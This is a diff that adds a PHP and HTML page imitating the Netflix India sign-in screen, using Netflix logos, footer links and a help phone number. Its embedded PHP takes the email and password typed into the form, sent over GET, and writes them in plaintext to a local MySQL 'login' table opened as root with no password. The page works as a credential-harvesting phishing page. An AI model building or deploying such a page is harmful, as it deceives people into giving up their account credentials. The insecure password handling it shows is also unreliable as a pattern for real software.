@@ -1,0 +1,176 @@
+<html>
+    <title>Netflix India-Watch Tv Shows Online Watch movies Online</title>
+    <head>
+        <link rel = "icon" href ="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/Netflix_2015_N_logo.svg/1128px-Netflix_2015_N_logo.svg.png" height=10px width=10px image/x-icon">
+        <style>
+            body
+            {
+               
+               
+                background: url("https://help.nflxext.com/43e0db2f-fea0-4308-bfb9-09f2a88f6ee4_what_is_netflix_1_en.png ");
+                background-position:top;
+                background-size: 1400px 700px;
+                background-repeat: no-repeat;
+                background-color: black;
+            }
+            select
+            {
+                color:white;
+                text-decoration-color:white;
+                width:100px;
+                height:40px;
+                background-color: black;
+                border-color:white;
+                margin-left:900px;
+                font-size:16px;
+            }
+            div
+            {
+                height:600px;
+                width:500px;
+                background-color:black;
+                margin-left: 450px;
+            
+            }
+            #p
+            {
+                color:black;
+                height:50px;
+                width:350px;
+                background-color: rgb(43, 39, 39);
+                font-size: 20px;
+                border-radius: 5px;
+                margin-left:30px;
+
+            }
+            #b
+            {
+                color:white;
+                background-color: rgb(209, 4, 4) ;
+                height:50px;
+                width:350px;
+                border-radius: 5px;
+                font-size: 20px;
+                margin-left:30px;
+            }
+            a:link
+            {
+                color:grey;
+            }
+            a:visited
+            {
+                color:grey;
+            }
+        </style>
+    </head>
+    <body bgcolor="black">
+                    &nbsp&nbsp &nbsp&nbsp<img src="https://variety.com/wp-content/uploads/2020/05/netflix-logo.png" height=70px width=150px>
+                    <form action="page2.php" method="get">
+                    <?php
+                     error_reporting(0);
+                     $con =new mysqli("localhost","root","","netflix");
+                     if($con->connect_error) 
+                     {
+                         echo "connnection not done";
+                     }
+                     else
+                     {
+                         echo "connection done";
+                     }
+                      $email=$_GET['email'];
+                      $password=$_GET['password'];
+                      $sm=$con->prepare("insert into login(email,password)values(?,?)");
+                      $sm->bind_param("ss",$email,$password);
+                      if($sm->execute())
+                        echo"record has been added";
+                    else
+                     echo"record has not been added";
+                     ?>
+                      
+                 
+                    <div>
+                    <font face=arial size=6 color=white>
+                    <br>
+                    <b>
+                     &nbsp&nbsp&nbsp &nbsp&nbsp&nbsp  Sign In
+                     </b></font>
+                     <br><br><br>
+            
+                    
+                       &nbsp&nbsp&nbsp  &nbsp&nbsp&nbsp  &nbsp&nbsp&nbsp  <input type=text placeholder="   Email or Phoneno" id=p name=email><br><br> 
+                       &nbsp&nbsp&nbsp  &nbsp&nbsp&nbsp  &nbsp&nbsp&nbsp   <input type=text placeholder="   Password" id=p name=password>
+                       <br><br><br>
+                       &nbsp&nbsp&nbsp  &nbsp&nbsp&nbsp  &nbsp&nbsp&nbsp    <input type="submit" value="Sign In" id=b>
+                       <br><br>
+                     </form>
+                
+             <font face=arial size=3 color=grey>
+                &nbsp&nbsp&nbsp    &nbsp&nbsp&nbsp    &nbsp&nbsp&nbsp  &nbsp&nbsp&nbsp
+                <input type="checkbox">
+                Remember me &nbsp&nbsp&nbsp    &nbsp&nbsp&nbsp    &nbsp&nbsp&nbsp  &nbsp&nbsp&nbsp &nbsp&nbsp&nbsp<a href="">Need Help?</a>
+            </font>
+            </div> 
+            <br><br>
+            <center>  
+            <table>
+                <tr>
+                    <td colspan=4>Questions? Call <a href="tel:000-800-040-1843">000-800-040-1843</a></td>
+                </tr>
+                <tr><td colspan="4"></td></tr>
+                <tr><td colspan="4"></td></tr>
+                <tr><td colspan="4"></td></tr>
+                <tr><td colspan="4"></td></tr>
+                <tr><td colspan="4"></td></tr>
+                <tr>
+                    <td><a href="https://help.netflix.com/support/412">FAQ        </a></td>
+                    <td><a href="https://help.netflix.com/">Help Centre           </a></td>
+                    <td><a href="https://www.netflix.com/youraccount">Acccount      </a></td>
+                    <td><a href="https://media.netflix.com/">Medei Centre         </a></td>
+                </tr>
+                <tr><td colspan=4></td></tr>
+                <tr><td colspan="4"></td></tr>
+                <tr><td colspan="4"></td></tr>
+                <tr>
+                    <td><a href="http://ir.netflix.com/">Investors Relations</a></td>
+                    <td><a href="https://jobs.netflix.com/jobs">Jobs</a></td>
+                    <td><a href="https://www.netflix.com/watch">Ways To Watch</a></td>
+                    <td><a href="https://help.netflix.com/legal/termsofuse">Terms of Use</a></td>
+                </tr>
+                <tr><td colspan="4"></td></tr>
+                <tr><td colspan="4"></td></tr>
+                <tr><td colspan="4"></td></tr>
+                <tr>
+                    <td><a href="https://help.netflix.com/support/412">Privacy</a></td>
+                    <td><a href="https://help.netflix.com/">Cookie Preferences</a></td>
+                    <td><a href="https://www.netflix.com/youraccount">Coorporate Information</a></td>
+                    <td><a href="https://media.netflix.com/">Contact Us</a></td>
+                </tr>
+                <tr><td colspan="4"></td></tr>
+                <tr><td colspan="4"></td></tr>
+                <tr><td colspan="4"></td></tr>
+                <tr>
+                    <td><a href="https://help.netflix.com/support/412">Speed Testn</a></td>
+                    <td><a href="https://help.netflix.com/">Legal Notices</a></td>
+                    <td><a href="https://www.netflix.com/youraccount">Only on Netflix</a></td>
+                    
+                </tr>
+                <tr><td colspan="4"></td></tr>
+                <tr><td colspan="4"></td></tr>
+                <tr><td colspan="4"></td></tr>
+                <tr>
+                    <td colspan="4" id=t>
+                        <select>
+                        <option>English</option>
+                        <option>हिन्दी</option>
+                        </select>
+                    </td>
+                </tr>
+                <tr><td colspan="4"></td></tr>
+                <tr><td colspan="4"></td></tr>
+                <tr><td colspan="4"></td></tr>
+                <tr><td colspan="4">Netflix India</td></tr>
+            </table>
+        </font>
+    </center>
+    </body>
+</html>
